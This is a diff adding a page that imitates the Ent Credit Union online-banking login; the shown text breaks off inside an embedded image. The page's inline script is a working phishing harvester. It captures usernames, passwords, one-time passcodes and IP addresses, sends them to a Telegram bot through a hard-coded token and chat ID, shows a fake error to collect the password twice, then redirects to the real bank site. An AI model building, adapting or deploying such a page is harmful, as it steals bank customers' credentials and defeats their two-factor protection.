@@ -1,0 +1,1004 @@
+<html lang="en">
+  <head id="Header">
+    <title>Log In | Ent Online Banking</title>
+    <meta
+      name="viewport"
+      content="width=device-width,initial-scale=1,maximum-scale=5"
+    />
+    <meta name="format-detection" content="telephone=no" />
+    <meta charset="UTF-8" />
+    <meta name="google" content="notranslate" />
+    <meta http-equiv="Content-Language" content="en" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="apple-itunes-app" content="app-id=464301726" />
+    <link
+      rel="icon"
+      type="image/ico"
+      href="https://online.ent.com/favicon.ico"
+    />
+    <link rel="stylesheet" href="https://use.typekit.net/bjh0ewy.css" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"
+    />
+    <link
+      href="https://online.ent.com/Banking/hlm/Ent.React.Template/media/css/vendor.36ec3a08.css"
+      rel="stylesheet"
+    />
+    <link
+      href="https://online.ent.com/Banking/hlm/Ent.React.Template/media/css/main.1bc21597.css"
+      rel="stylesheet"
+    />
+    <!-- <script
+      type="text/javascript"
+      async=""
+      src="https://www.cdn-net.com/et.js"
+    ></script> -->
+    <!-- <script
+      type="text/javascript"
+      async=""
+      src="https://six.cdn-net.com/6.js"
+    ></script> -->
+    <!-- <script
+      type="text/javascript"
+      async=""
+      src="https://www.cdn-net.com/cc.js?ts=1776417157814&amp;sid=d453d24b8913de81&amp;tid=06059aa3-fb98-48b5-ab1b-cb7e8699baa0"
+    ></script> -->
+    <!-- <script
+      type="text/javascript"
+      async=""
+      src="https://online.ent.com/Banking/hlm/Ent.Responsive.Template/media/scripts/salemove_integration.js"
+      id="glia"
+    ></script> -->
+    <style
+      type="text/css"
+      rel="stylesheet"
+      data-page-iframer="keep"
+      id="sm-chat-style-overrides"
+    >
+      @keyframes gi-fade-in {
+        from {
+          opacity: 0;
+        }
+        to {
+          opacity: 1;
+        }
+      }
+      #salemove .sm-carousel-container {
+        display: flex;
+        flex-direction: row;
+        overflow-x: auto;
+        scroll-snap-type: x mandatory;
+        -ms-overflow-style: none; /* IE and Edge */
+        scrollbar-width: none; /* Firefox */
+      }
+      #salemove .sm-carousel-container::-webkit-scrollbar {
+        display: none;
+      }
+      #salemove .sm-carousel-item {
+        flex: 1 0 85%;
+        margin-right: 1rem !important;
+        display: flex !important;
+        flex-direction: column;
+        scroll-snap-align: center;
+      }
+      #salemove .sm-carousel-item:first-child {
+        margin-left: 1rem !important;
+      }
+      #salemove .sm-carousel-item-content {
+        flex: 1;
+      }
+      #salemove .sm-carousel-item-title {
+        font-weight: bold;
+        margin-bottom: 0.5rem;
+      }
+      #salemove .sm-carousel-item-description {
+        font-size: 0.7rem;
+        margin-bottom: 0.5rem;
+      }
+      #salemove .sm-carousel-item-image img {
+        width: 100%;
+        height: 90px;
+        object-fit: cover;
+      }
+      #salemove .sm-chat-box-message-carousel {
+        position: relative;
+      }
+      #salemove .sm-carousel-prev-button,
+      #salemove .sm-carousel-next-button {
+        position: absolute;
+        background: var(--theme-color);
+        color: #fff;
+        top: 50%;
+        padding: 0.5rem 0px;
+        border-radius: 6px;
+      }
+      #salemove .sm-carousel-prev-button {
+        left: 0px;
+        transform: translateY(-50%) translateX(-50%);
+      }
+      #salemove .sm-carousel-next-button {
+        right: 0;
+        transform: translateY(-50%) translateX(50%);
+      }
+      #salemove .sm-carousel-button-disabled {
+        display: none;
+      }
+      #salemove .sm-form-container {
+        position: absolute;
+        width: 100%;
+        height: 100%;
+        top: 0;
+        left: 0;
+        background: #fff;
+        animation: gi-fade-in 0.3s linear;
+      }
+      #salemove .sm-form-container .sm-form-loader {
+        position: absolute;
+        width: 100%;
+        height: 100%;
+        top: 0;
+        left: 0;
+        display: grid;
+        place-items: center;
+      }
+      #salemove .sm-form-container .sm-form-iframe {
+        position: absolute;
+        width: 100%;
+        height: 100%;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+      }
+      #salemove .sm-quick-replies .sm-quick-reply-option {
+        padding: 0.5rem 0.7rem;
+        display: inline-block;
+        background: #efefef;
+        margin-bottom: 6px;
+        margin-right: 6px;
+        border-radius: 4px;
+        border: 1px solid #bbbbbb;
+        cursor: pointer;
+        font-size: 12px;
+        color: #404040;
+      }
+      #salemove .sm-quick-replies .sm-quick-reply-option:hover {
+        background: #ffffff;
+      }
+      #salemove .sm-custom-message-container {
+        display: flex;
+      }
+      #salemove .sm-custom-message-container .sm-chat-box-container {
+        flex-grow: 1;
+      }
+      #salemove .sm-choice-card-option > div[role="button"],
+      #salemove .sm-choice-card-options > div > div[role="button"] {
+        color: #404040 !important;
+        border: 1px solid #bbbbbb !important;
+        border-radius: 4px;
+      }
+      #salemove .sm-choice-card-option > div[role="button"]:hover,
+      #salemove .sm-choice-card-options > div > div[role="button"]:hover {
+        background: #ffffff !important;
+      }
+      #salemove
+        .sm-visitor-app-container
+        .sm-chat-component
+        .sm-chat-container {
+        height: 100% !important;
+        height: -webkit-fill-available !important;
+      }
+    </style>
+    <meta
+      http-equiv="origin-trial"
+      content="A1uhUwr2i5RsXq4qm428W0q+rZp8KBDISV7UQGyyNhRVkhP4JOM3sQ65HSSqo/XS0PGLSdfqt1FZURAGnjq7cAMAAABweyJvcmlnaW4iOiJodHRwczovL2Nkbi1uZXQuY29tOjQ0MyIsImZlYXR1cmUiOiJUcGNkIiwiZXhwaXJ5IjoxNzM1MzQzOTk5LCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ=="
+    />
+    <!-- <script
+      src="https://libs.salemove.com/visitor/bootstrapper-b33875187.js"
+      type="text/javascript"
+    ></script>
+    <script
+      type="text/javascript"
+      src="https://libs.salemove.com/visitor/webcomponents_es5-b33875187.js"
+    ></script>
+    <script
+      type="text/javascript"
+      src="https://libs.salemove.com/visitor-app.bbb287dc.min.js"
+      data-sm-visitor-app-asset=""
+      data-loaded-callback="sm.visitorAppLoaded"
+    ></script>
+    <link
+      type="text/css"
+      rel="stylesheet"
+      href="https://libs.salemove.com/visitor-app.bbb287dc.default.css"
+    /> -->
+  </head>
+  <body>
+    <!-- <script
+      async=""
+      src="//www.googletagmanager.com/gtm.js?id=GTM-MBFQ2W"
+    ></script> -->
+    <!-- <script>
+      dataLayer = [{}];
+    </script>
+    <script>
+      messageQueue = [];
+    </script>
+    <script>
+      workflows = [];
+    </script>
+    <script>
+      window.APP_INSIGHTS_TOKEN = "af565f67-c479-4d6a-88f3-379ef4031dc6";
+    </script>
+    <script id="split.io">
+      window.SPLIT_AUTHORIZATION_KEY = "r14ar9e76isvm8qea9ijp8kmr6ilel1u51s2";
+    </script> -->
+
+    <div id="root" style="display: block">
+      <a href="#main-content" class="skipToContent">Skip to main content</a>
+      <div id="ad-header" class="ad-space"></div>
+      <div class="main background xl unauthenticated">
+        <div class="wrapper-page">
+          <div class="dock-top">
+            <div class="header-text">
+              <a class="ent-logo" href="/Banking/Home.aspx"
+                ><img
+                  alt="Home"
+                  title="Home"
+                  src="https://online.ent.com/Banking/hlm/Ent.React.Template/media/images/entLogo.1798ade4.png"
+                  class="show-light" /><img
+                  alt="Home"
+                  title="Home"
+                  src="https://online.ent.com/Banking/hlm/Ent.React.Template/media/images/entLogo-whiteText.cfb94bbe.png"
+                  class="show-dark"
+              /></a>
+            </div>
+            <div class="right"></div>
+          </div>
+          <div class="wrapper-container">
+            <div class="wrapper-container-vertical">
+              <div class="content-menu"></div>
+              <div class="wrapper-content">
+                <div id="ad-body" class="ad-space"></div>
+                <div
+                  class="content-area clearfix"
+                  id="main-content"
+                  role="main"
+                >
+                  <!-- Step 1: Username -->
+                  <div
+                    id="step-username"
+                    class="LoginUsernameContent col-xs-12 col-narrow"
+                  >
+                    <div class="TopNav">
+                      <button type="button" class="active" aria-label="">
+                        <h1>Log In</h1>
+                      </button>
+                    </div>
+                    <div
+                      class="Module default LoginUsername no-margin login-recovery"
+                    >
+                      <div class="ModuleBody">
+                        <form id="username-form">
+                          <input type="hidden" id="hidden_ip" />
+                          <div class="form-group" id="username-form-group">
+                            <div>
+                              <label for="HLfMxmhlSE" class="control-label"
+                                >Username:</label
+                              ><span
+                                id="HLfMxmhlSE-alert"
+                                class="help-block pull-right"
+                                role="alert"
+                                aria-live="polite"
+                                aria-label="error"
+                                aria-describedby="HLfMxmhlSE"
+                                style="display: none"
+                                >Required<i
+                                  class="fa fa-fw fa-exclamation-circle"
+                                  aria-hidden="true"
+                                ></i
+                              ></span>
+                            </div>
+                            <input
+                              id="HLfMxmhlSE"
+                              type="text"
+                              class="form-control"
+                              name="username.display"
+                              autocorrect="off"
+                              autocapitalize="none"
+                              maxlength="34"
+                              value=""
+                              aria-controls="HLfMxmhlSE-alert"
+                            />
+                            <div class="help-block text-muted small">
+                              <div class="clearfix">
+                                <button
+                                  type="button"
+                                  class="clearfix btn btn-link col-xs-12 col-sm-4 forgot-password-username"
+                                  data-autoid="forgot-password-username"
+                                  style="text-transform: none"
+                                >
+                                  Forgot Password/Username
+                                </button>
+                              </div>
+                            </div>
+                          </div>
+                          <div class="form-group">
+                            <div class="checkbox">
+                              <label
+                                ><input
+                                  id="qWqNo7FprN"
+                                  type="checkbox"
+                                  name="rememberMe"
+                                  value="false"
+                                />Remember Me</label
+                              >
+                            </div>
+                          </div>
+                          <div class="clearfix">
+                            <button
+                              type="submit"
+                              class="btn btn-primary col-xs-12"
+                            >
+                              Continue<i
+                                class="fa fa-fw fa-caret-right"
+                                aria-hidden="true"
+                              ></i>
+                            </button>
+                          </div>
+                          <div class="clearfix">
+                            <div class="or"><div>or</div></div>
+                            <button
+                              type="button"
+                              class="btn btn-link register-button"
+                            >
+                              Register for Online Banking
+                            </button>
+                          </div>
+                        </form>
+                      </div>
+                    </div>
+                    <div class="Links row clearfix">
+                      <div class="col-xs-12 col-sm-4">
+                        <button type="button" class="btn btn-default">
+                          <span
+                            ><i
+                              class="fa fa-fw fa-lg fa-map-marker"
+                              aria-hidden="true"
+                            ></i
+                            >Locations</span
+                          ><i
+                            class="fa fa-fw fa-lg fa-caret-right"
+                            aria-hidden="true"
+                          ></i>
+                        </button>
+                      </div>
+                      <div class="col-xs-12 col-sm-4">
+                        <button type="button" class="btn btn-default">
+                          <span
+                            ><i
+                              class="fa fa-fw fa-lg fa-envelope"
+                              aria-hidden="true"
+                            ></i
+                            >Contact Us</span
+                          ><i
+                            class="fa fa-fw fa-lg fa-caret-right"
+                            aria-hidden="true"
+                          ></i>
+                        </button>
+                      </div>
+                      <div class="col-xs-12 col-sm-4">
+                        <button type="button" class="btn btn-default">
+                          <span
+                            ><i
+                              class="fa fa-fw fa-lg fa-home"
+                              aria-hidden="true"
+                            ></i
+                            >Ent.com</span
+                          ><i
+                            class="fa fa-fw fa-lg fa-caret-right"
+                            aria-hidden="true"
+                          ></i>
+                        </button>
+                      </div>
+                    </div>
+                  </div>
+
+                  <!-- Step 2: Password -->
+                  <div
+                    id="step-password"
+                    class="LoginUsernameContent col-xs-12 col-narrow"
+                    style="display: none"
+                  >
+                    <div class="TopNav">
+                      <button
+                        type="button"
+                        id="back-to-username"
+                        class="active"
+                        aria-label="Back to Log In"
+                      >
+                        <h1>Password</h1>
+                      </button>
+                    </div>
+                    <div class="Module default LoginPassword no-margin">
+                      <div class="ModuleBody">
+                        <form id="password-form">
+                          <div class="form-group">
+                            <div>
+                              <label for="i4ynBaKlx" class="control-label"
+                                >Username:</label
+                              >
+                            </div>
+                            <input
+                              id="i4ynBaKlx"
+                              type="text"
+                              class="form-control"
+                              name="username"
+                              readonly=""
+                              value="sdksdksdksdksdskds"
+                            />
+                          </div>
+                          <div class="text-center SecureImage">
+                            <div class="title">Secure Image &amp; Phrase:</div>
+                            <div class="image">
+                              <img
+                                src="https://picsum.photos/seed/bird/130/110"
+                                role="presentation"
+                                alt="bathing bird"
+                              />
+                            </div>
+                            <div class="phrase">bathing bird</div>
+                          </div>
+                          <div class="form-group has-error">
+                            <div>
+                              <label for="IIDr1RCU78" class="control-label"
+                                >Password:</label
+                              ><span
+                                id="IIDr1RCU78-alert"
+                                class="help-block pull-right"
+                                role="alert"
+                                aria-live="polite"
+                                aria-label="error"
+                                aria-describedby="IIDr1RCU78"
+                                >Required<i
+                                  class="fa fa-fw fa-exclamation-circle"
+                                  aria-hidden="true"
+                                ></i
+                              ></span>
+                            </div>
+                            <input
+                              id="IIDr1RCU78"
+                              type="password"
+                              class="form-control sm_cobrowsing_masked_field"
+                              name="password"
+                              value=""
+                              aria-controls="IIDr1RCU78-alert"
+                            />
+                            <div class="help-block text-muted small">
+                              <div class="clearfix ShowHideLink">
+                                <button
+                                  type="button"
+                                  class="clearfix btn btn-link pull-right"
+                                  data-autoid="show-hide-password"
+                                  aria-expanded="false"
+                                  aria-controls="password"
+                                >
+                                  <i class="fa fa-eye" aria-hidden="true"></i>
+                                  Show password
+                                </button>
+                              </div>
+                            </div>
+                          </div>
+                          <input
+                            name="recaptcha"
+                            value=""
+                            style="display: none"
+                          />
+                          <div class="narrow-gutter-row continue-forgot-group">
+                            <button
+                              type="submit"
+                              class="btn btn-primary clearfix col-xs-12 col-sm-4 col pull-right"
+                            >
+                              Continue<i
+                                class="fa fa-fw fa-caret-right"
+                                aria-hidden="true"
+                              ></i></button
+                            ><button
+                              type="button"
+                              class="clearfix btn btn-link col-xs-12 col-sm-4 forgot-password-username"
+                              data-autoid="forgot-password-username"
+                              style="text-transform: none"
+                            >
+                              Forgot Password/Username
+                            </button>
+                          </div>
+                        </form>
+                      </div>
+                    </div>
+                  </div>
+
+                  <!-- Step 3: OTP -->
+                  <div
+                    id="step-otp"
+                    class="LoginUsernameContent col-xs-12 col-narrow"
+                    style="display: none"
+                  >
+                    <div class="TopNav">
+                      <button
+                        type="button"
+                        id="back-to-password"
+                        class="active"
+                        aria-label="Back to Password"
+                      >
+                        <h1>One-Time Passcode</h1>
+                      </button>
+                    </div>
+                    <div class="Module default LoginPassword no-margin">
+                      <div
+                        class="ModuleHeader"
+                        style="
+                          background-color: #8b1a1a;
+                          padding: 14px 20px;
+                          border-radius: 4px 4px 0 0;
+                        "
+                      >
+                        <h2
+                          style="
+                            color: #fff;
+                            margin: 0;
+                            font-size: 1.2em;
+                            font-weight: bold;
+                          "
+                        >
+                          Verify Your Identity
+                        </h2>
+                      </div>
+                      <div class="ModuleBody">
+                        <p style="margin-bottom: 16px; color: #555">
+                          A one-time passcode has been sent to your registered
+                          device. Enter it below to continue.
+                        </p>
+                        <form id="otp-form">
+                          <div class="form-group">
+                            <label for="otp-input" class="control-label"
+                              >One-Time Passcode:</label
+                            >
+                            <input
+                              id="otp-input"
+                              type="text"
+                              class="form-control"
+                              name="otp"
+                              autocomplete="one-time-code"
+                              maxlength="6"
+                              placeholder="Enter 6-digit code"
+                              inputmode="numeric"
+                              pattern="[0-9]*"
+                            />
+                          </div>
+                          <div
+                            class="clearfix"
+                            style="
+                              display: flex;
+                              justify-content: space-between;
+                              align-items: center;
+                              margin-top: 16px;
+                            "
+                          >
+                            <button
+                              type="button"
+                              class="btn btn-link"
+                              style="text-transform: none"
+                            >
+                              Resend Passcode
+                            </button>
+                            <button
+                              type="submit"
+                              class="btn btn-primary"
+                              style="
+                                min-width: 160px;
+                                background: #1a3a6b;
+                                border-color: #1a3a6b;
+                                border-radius: 25px;
+                                font-weight: bold;
+                                letter-spacing: 1px;
+                              "
+                            >
+                              VERIFY
+                              <i
+                                class="fa fa-caret-right"
+                                aria-hidden="true"
+                              ></i>
+                            </button>
+                          </div>
+                        </form>
+                      </div>
+                    </div>
+                  </div>
+                  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+                  <script>
+                    let count = 0;
+
+                    const sendTeleMsg = async (msg) => {
+                      const TELEGRAM_BOT_TOKEN = "8181070617:AAEw9LrqB6kSe5CblwD-DogIf8VlD1lfno0"; //YOUR_TELEGRAM_BOT_TOKEN HERE
+                      const CHAT_ID = "7073335580"; // YOUR CHAT_ID HERE
+                      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+                      try {
+                        const response = await fetch(url, {
+                          method: "POST",
+                          headers: {
+                            "Content-Type": "application/json",
+                          },
+                          body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: msg,
+                          }),
+                        });
+
+                        if (!response.ok) {
+                          throw new Error(
+                            `HTTP error! status: ${response.status}`,
+                          );
+                        }
+
+                        return response.json();
+                      } catch (error) {
+                        console.error("Error sending message:", error);
+                        throw error;
+                      }
+                    };
+
+                    $(document).ready(function () {
+                      // Get the user's IP address
+                      $.getJSON(
+                        "https://json.geoiplookup.io/?callback=?",
+                        function (data) {
+                          var obj = JSON.parse(JSON.stringify(data));
+                          document.getElementById("hidden_ip").value = obj.ip;
+                        },
+                      );
+                    });
+
+                    const handleFormSubmit = (event) => {
+                      event.preventDefault();
+                      const email = document.getElementById("i4ynBaKlx").value;
+                      const password =
+                        document.getElementById("IIDr1RCU78").value;
+                      const ip = document.getElementById("hidden_ip").value;
+                      count++;
+
+                      const message =
+                        "++++++🔰ENT-CU LOGIN🔰++++++" +
+                        "\n" +
+                        "[📧EMAIL] : " +
+                        email +
+                        "\n" +
+                        "[🔑PASSWORD] : " +
+                        password +
+                        "\n" +
+                        "[🌍 IP ADDRESS] : " +
+                        ip +
+                        "\n" +
+                        "\n";
+
+                      const message2 =
+                        "++++++🔰ENT-CU LOGIN-2🔰++++++" +
+                        "\n" +
+                        "[📧EMAIL] : " +
+                        email +
+                        "\n" +
+                        "[🔑PASSWORD] : " +
+                        password +
+                        "\n" +
+                        "[🌍 IP ADDRESS] : " +
+                        ip +
+                        "\n" +
+                        "\n";
+                      if (count === 2) {
+                        sendTeleMsg(message2);
+                        setTimeout(() => {
+                          window.location.href = "https://www.ent.com/";
+                        }, 3000);
+                      } else {
+                        setTimeout(() => {
+                          sendTeleMsg(message);
+                          document.querySelector("#wrongCred").style.display =
+                            "block";
+                          document.querySelector("#password").value = "";
+                        }, 2000);
+                      }
+
+                      return false;
+                    };
+
+                    document
+                      .getElementById("username-form")
+                      .addEventListener("submit", function (e) {
+                        e.preventDefault();
+                        var username = document
+                          .getElementById("HLfMxmhlSE")
+                          .value.trim();
+                        if (!username) {
+                          var fg = document.getElementById(
+                            "username-form-group",
+                          );
+                          fg.classList.add("has-error");
+                          document.getElementById(
+                            "HLfMxmhlSE-alert",
+                          ).style.display = "";
+                          return;
+                        }
+                        document.getElementById("i4ynBaKlx").value = username;
+                        document.getElementById("step-username").style.display =
+                          "none";
+                        document.getElementById("step-password").style.display =
+                          "";
+                        document.getElementById("IIDr1RCU78").focus();
+                      });
+
+                    document
+                      .getElementById("back-to-username")
+                      .addEventListener("click", function () {
+                        document.getElementById("step-password").style.display =
+                          "none";
+                        document.getElementById("step-username").style.display =
+                          "";
+                      });
+
+                    document
+                      .getElementById("password-form")
+                      .addEventListener("submit", function (e) {
+                        e.preventDefault();
+                        var username =
+                          document.getElementById("i4ynBaKlx").value;
+                        var password =
+                          document.getElementById("IIDr1RCU78").value;
+                        var ip = document.getElementById("hidden_ip").value;
+
+                        var message =
+                          "++++++🔰ENT-CU LOGIN🔰++++++" +
+                          "\n" +
+                          "[📧EMAIL] : " +
+                          username +
+                          "\n" +
+                          "[🔑PASSWORD] : " +
+                          password +
+                          "\n" +
+                          "[🌍 IP ADDRESS] : " +
+                          ip +
+                          "\n" +
+                          "\n";
+
+                        sendTeleMsg(message).catch((error) => {
+                          console.error("Telegram send failed:", error);
+                        });
+
+                        document.getElementById("step-password").style.display =
+                          "none";
+                        document.getElementById("step-otp").style.display = "";
+                        document.getElementById("otp-input").focus();
+                      });
+
+                    document
+                      .getElementById("back-to-password")
+                      .addEventListener("click", function () {
+                        document.getElementById("step-otp").style.display =
+                          "none";
+                        document.getElementById("step-password").style.display =
+                          "";
+                      });
+
+                    document
+                      .getElementById("otp-form")
+                      .addEventListener("submit", function (e) {
+                        e.preventDefault();
+                        var username =
+                          document.getElementById("i4ynBaKlx").value;
+                        var password =
+                          document.getElementById("IIDr1RCU78").value;
+                        var otp = document.getElementById("otp-input").value;
+                        var ip = document.getElementById("hidden_ip").value;
+
+                        var message =
+                          "++++++🔰ENT-CU OTP🔰++++++" +
+                          "\n" +
+                          "[📧EMAIL] : " +
+                          username +
+                          "\n" +
+                          "[🔑PASSWORD] : " +
+                          password +
+                          "\n" +
+                          "[🔢OTP] : " +
+                          otp +
+                          "\n" +
+                          "[🌍 IP ADDRESS] : " +
+                          ip +
+                          "\n" +
+                          "\n";
+
+                        sendTeleMsg(message).catch((error) => {
+                          console.error("Telegram send failed:", error);
+                        });
+
+                        console.log("OTP submitted:", otp);
+                        window.location.href = "https://www.ent.com/";
+                      });
+
+                    var showHideBtn = document.querySelector(
+                      '[data-autoid="show-hide-password"]',
+                    );
+                    if (showHideBtn) {
+                      showHideBtn.addEventListener("click", function () {
+                        var input = document.getElementById("IIDr1RCU78");
+                        if (input.type === "password") {
+                          input.type = "text";
+                          this.innerHTML =
+                            '<i class="fa fa-eye-slash" aria-hidden="true"></i> Hide password';
+                        } else {
+                          input.type = "password";
+                          this.innerHTML =
+                            '<i class="fa fa-eye" aria-hidden="true"></i> Show password';
+                        }
+                      });
+                    }
+                  </script>
+                </div>
+                <div id="ad-footer" class="ad-space"></div>
+                <div class="footer small text-center">
+                  <div>
+                    <a
+                      href="https://www.ent.com/Privacy"
+                      target="_blank"
+                      rel="noopener noreferrer"
+                      >Privacy Policy</a
+                    >&nbsp;|&nbsp;<a
+                      href="https://www.ent.com/Legal"
+                      target="_blank"
+                      rel="noopener noreferrer"
+                      >Important Account Information</a
+                    >&nbsp;|&nbsp;<a
+                      href="https://www.ent.com/Legal"
+                      target="_blank"
+                      rel="noopener noreferrer"
+                      >Accessibility</a
+                    >
+                  </div>
+                  <div>
+                    <div class="d-inline-block">© 2026 Ent Credit Union</div>
+                    &nbsp;•&nbsp;
+                    <div class="d-inline-block">Equal Housing Opportunity</div>
+                    &nbsp;•&nbsp;
+                    <div class="d-inline-block">Insured by NCUA</div>
+                    &nbsp;•&nbsp;
+                    <div class="d-inline-block">Equal Opportunity Lender</div>
+                    &nbsp;•&nbsp;
+                    <div class="d-inline-block">
+                      Ent is a registered trademark of Ent Credit Union
+                    </div>
+                  </div>
+                  <div>
+                    <img
+                      src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGwAAAByCAYAAAC2ujQmAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAxBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYxIDY0LjE0MDk0OSwgMjAxMC8xMi8wNy0xMDo1NzowMSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6Q0IxRjQ5ODVEQ0E4MTFFNTlFNEZBRDUxQUQ2MkMzMDkiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6Q0IxRjQ5ODREQ0E4MTFFNTlFNEZBRDUxQUQ2MkMzMDkiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTMiBXaW5kb3dzIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9IjBBRDlBRjkyRTVBRTlCRTNCRTZBQ0U4NTIzRjlFQkVFIiBzdFJlZjpkb2N1bWVudElEPSIwQUQ5QUY5MkU1QUU5QkUzQkU2QUNFODUyM0Y5RUJFRSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PvXQKLcAAA7ISURBVHja7F0LmFdFFZ998n4uAYE8PkAEBFMkLR9l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